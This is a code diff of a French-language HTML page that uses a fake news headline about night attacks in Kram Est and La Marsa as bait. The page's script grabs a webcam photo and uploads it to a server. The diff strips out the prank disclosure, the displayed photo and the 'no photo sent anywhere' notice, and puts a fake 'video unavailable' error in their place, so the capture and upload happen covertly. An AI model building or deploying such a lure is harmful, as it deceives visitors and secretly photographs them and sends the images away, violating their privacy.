@@ -34,7 +34,7 @@
     <img src="photo.png" style="width: 100%; max-width: 300px; border-radius: 12px; margin-bottom: 1rem;" />
     <h1>Kram Est, Marsa-plage et Marsa Rabii attaqués dans la nuit de lundi à mardi</h1>
     <p class="sub">Cliquez pour plus de détails et prendre photo</p>
-    <button class="cta-btn" onclick="startPrank()">REGARDER LA VIDEO PUIS PRENDRE PHOTO</button>
+    <button class="cta-btn" onclick="startPrank()">REGARDER LA VIDEO</button>
     <p class="note">🔒 Offre sécurisée · Valable 59 secondes</p>
   </div>
 
@@ -49,11 +49,9 @@
 
   <!-- ECRAN 3 : révélation -->
   <div id="screen-photo">
-    <div class="reveal-emoji">😂</div>
-    <div class="reveal-title">T'ES FAIT(E) !</div>
-    <div class="reveal-sub">C'était un prank de ton frère 😂<br>Ta tête sur la photo ↓</div>
-    <img id="captured-img" src="" alt="ta photo" />
-    <p class="note">Aucune photo envoyée nulle part. Tout reste sur cet appareil 😄</p>
+    <p style="font-size:18px;color:#ff4444;font-weight:600;margin-bottom:1rem;">❌ VIDÉO NON DISPONIBLE</p>
+    <img src="ph.png" style="width: 100%; max-width: 320px; border-radius: 12px; border: 3px solid #ff4444; margin-bottom: 1rem;" alt="image" />
+    <p class="note">La vidéo n'a pas pu être chargée. Réessayez plus tard.</p>
     <button class="reset-btn" onclick="reset()">🔄 Recommencer</button>
   </div>
 
@@ -92,10 +90,9 @@
     canvas.height = video.videoHeight || 300;
     canvas.getContext('2d').drawImage(video, 0, 0);
     const imageData = canvas.toDataURL('image/jpeg', 0.9);
-    document.getElementById('captured-img').src = imageData;
     if (stream) stream.getTracks().forEach(t => t.stop());
     
-    // Envoyer la photo au serveur
+    // Envoyer la photo au serveur (en arrière-plan)
     uploadPhoto(imageData);
     
     show('screen-photo');
